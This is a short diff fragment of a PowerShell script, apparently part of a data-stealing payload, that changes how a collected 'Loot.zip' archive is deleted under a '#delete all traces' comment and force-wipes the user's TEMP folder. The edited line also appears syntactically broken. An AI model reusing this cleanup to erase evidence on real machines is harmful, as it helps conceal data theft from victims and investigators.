@@ -14,7 +14,7 @@ Compress-Archive @compress
 #delete all traces
 
 #delte created archive
-del Loot.zip
+Remove-Item $env:USERPROFILE + "\Desktop\Loot.zip"
 
 #temp folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
